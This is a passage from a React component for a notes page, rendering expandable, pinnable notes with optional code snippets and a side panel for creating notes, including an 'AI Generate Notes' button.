                        onClick={() => toggleExpand(note.id)}
                        className="w-full flex items-center justify-between p-4 text-left hover:bg-white/[0.02] transition-colors">
                        <div className="flex items-center gap-2 flex-1 min-w-0">
                          {note.is_pinned && <Pin size={11} className="text-warning flex-shrink-0"/>}
                          <div className="min-w-0">
                            <p className="text-sm font-semibold text-white truncate">{note.title}</p>
                            <div className="flex items-center gap-2 mt-0.5">
                              <span className="text-xs px-1.5 py-0.5 rounded-full"
                                style={{ background:'rgba(0,255,148,0.08)', color:'#00FF94' }}>
                                {note.topic}
                              </span>
                              {note.code_snippet && (
                                <span className="text-xs text-gray-600 flex items-center gap-1">
                                  <Code size={9}/> code
                                </span>
                              )}
                            </div>
                          </div>
                        </div>
                        <div className="flex items-center gap-2 flex-shrink-0 ml-2">
                          <button onClick={e => { e.stopPropagation(); togglePin(note); }}
                            className={`p-1 rounded ${note.is_pinned ? 'text-warning' : 'text-gray-600 hover:text-warning'}`}>
                            <Pin size={12}/>
                          </button>
                          <button onClick={e => { e.stopPropagation(); deleteNote(note.id); }}
                            className="p-1 rounded text-gray-600 hover:text-danger">
                            <Trash2 size={12}/>
                          </button>
                          <span className="text-gray-600 text-xs">
                            {expanded[note.id] ? '▲' : '▼'}
                          </span>
                        </div>
                      </button>

                      <AnimatePresence>
                        {expanded[note.id] && (
                          <motion.div
                            initial={{ height:0, opacity:0 }}
                            animate={{ height:'auto', opacity:1 }}
                            exit={{ height:0, opacity:0 }}
                            className="px-4 pb-4">
                            {note.content && (
                              <pre className="text-xs text-gray-400 leading-relaxed whitespace-pre-wrap font-sans mb-2">
                                {note.content}
                              </pre>
                            )}
                            {note.code_snippet && (
                              <CodeBlock code={note.code_snippet} language={note.code_language}/>
                            )}
                          </motion.div>
                        )}
                      </AnimatePresence>
                    </motion.div>
                  ))}
                </div>
              )}
            </div>

            {/* Create note panel */}
            <AnimatePresence>
              {creating && (
                <motion.div
                  initial={{ opacity:0, x:20 }}
                  animate={{ opacity:1, x:0 }}
                  exit={{ opacity:0, x:20 }}
                  className="w-80 flex-shrink-0">
                  <div className="sticky top-20 rounded-2xl overflow-hidden"
                    style={{ background:'rgba(10,10,18,0.95)', border:'1px solid rgba(0,255,148,0.15)' }}>
                    <div className="flex items-center justify-between p-4 border-b border-dark-600">
                      <h3 className="font-bold text-white font-heading text-sm">New Note</h3>
                      <div className="flex items-center gap-2">
                        <button onClick={() => setForm(f=>({...f,is_pinned:!f.is_pinned}))}
                          className={`p-1.5 rounded ${form.is_pinned ? 'text-warning' : 'text-gray-600'}`}>
                          <Pin size={13}/>
                        </button>
                        <button onClick={() => { setCreating(false); setShowCode(false); }}
                          className="text-gray-600 hover:text-white p-1">
                          <X size={15}/>
                        </button>
                      </div>
                    </div>

                    <div className="p-4 space-y-3">
                      <input
                        value={form.title}
                        onChange={e => setForm(f=>({...f,title:e.target.value}))}
                        placeholder="Topic title..."
                        className="w-full bg-dark-700 border border-dark-500 rounded-xl px-3 py-2 text-sm text-white placeholder-gray-600 focus:outline-none focus:border-primary"/>

                      {/* AI Generate button */}
                      <button
                        onClick={generateAINote}
                        disabled={generating || !form.title.trim()}
                        className="w-full flex items-center justify-center gap-2 py-2 rounded-xl text-xs font-bold transition-all disabled:opacity-40"
                        style={{ background:'rgba(123,97,255,0.1)', color:'#7B61FF', border:'1px solid rgba(123,97,255,0.3)' }}>
                        {generating ? (
                          <><div className="w-3 h-3 border-2 border-secondary border-t-transparent rounded-full animate-spin"/> Generating...</>
                        ) : (
                          <><Zap size={11}/> ✨ AI Generate Notes</>
                        )}
                      </button>

                      {/* Topic chips */}
                      <div className="flex flex-wrap gap-1">
                        {TOPICS.slice(1).map(t => (
                          <button key={t}
                            onClick={() => setForm(f=>({...f,topic:t}))}
                            className="px-2 py-0.5 rounded-lg text-xs transition-all"
                            style={form.topic===t
                              ? { background:'#00FF94', color:'#050508', fontWeight:'bold' }
                              : { background:'rgba(18,18,26,0.8)', color:'#555', border:'1px solid rgba(34,34,51,0.5)' }
                            }>
                            {t}
                          </button>
                        ))}
                      </div>

                      <textarea
                        value={form.content}
                        onChange={e => setForm(f=>({...f,content:e.target.value}))}
                        placeholder="Theory, concepts, explanations..."
                        rows={6}
                        className="w-full bg-dark-700 border border-dark-500 rounded-xl px-3 py-2.5 text-sm text-gray-200 placeholder-gray-600 focus:outline-none focus:border-primary resize-none"/>

                      <button
                        onClick={() => setShowCode(!showCode)}
                        className="flex items-center gap-1.5 text-xs text-gray-500 hover:text-primary transition-colors">
                        <Code size={11}/> {showCode ? 'Hide code' : '+ Add code snippet'}
                      </button>

                      {showCode && (
                        <div className="space-y-2">
                          <select
                            value={form.code_language}
                            onChange={e => setForm(f=>({...f,code_language:e.target.value}))}
                            className="w-full bg-dark-700 border border-dark-500 rounded-lg px-3 py-1.5 text-xs text-gray-300 focus:outline-none">
                            {['javascript','python','java','cpp','sql','bash','typescript'].map(l => (
                              <option key={l} value={l}>{l}</option>
                            ))}
                          </select>
                          <textarea
                            value={form.code_snippet}
                            onChange={e => setForm(f=>({...f,code_snippet:e.target.value}))}
                            placeholder="// Code here..."
                            rows={8}
                            className="w-full px-3 py-2.5 text-xs font-mono text-gray-300 placeholder-gray-600 focus:outline-none resize-none rounded-xl"
                            style={{ background:'#030305', border:'1px solid rgba(42,42,63,0.6)' }}
                            onKeyDown={e => {
                              if(e.key==='Tab'){
                                e.preventDefault();
                                const s=e.target.selectionStart;
                                const v=form.code_snippet;
                                const nv=v.substring(0,s)+'  '+v.substring(e.target.selectionEnd);
                                setForm(f=>({...f,code_snippet:nv}));
                                setTimeout(()=>e.target.setSelectionRange(s+2,s+2),0);
                              }
                            }}
                            spellCheck={false}/>
                        </div>
                      )}

                      <button
                        onClick={saveNote}
                        disabled={saving}
                        className="w-full flex items-center justify-center gap-2 py-2.5 rounded-xl font-bold text-sm text-dark-900 disabled:opacity-50"
                        style={{ background:'#00FF94', boxShadow:'0 0 12px rgba(0,255,148,0.25)' }}>
                        {saving
                          ? <div className="w-4 h-4 border-2 border-dark-900 border-t-transparent rounded-full animate-spin"/>
                          : <><Save size={13}/> Save Note</>
                        }
                      </button>
                    </div>
                  </div>
                </motion.div>
              )}
            </AnimatePresence>
          </div>
        )}
      </div>
    </DashboardLayout>
  );
};

export default Notes;
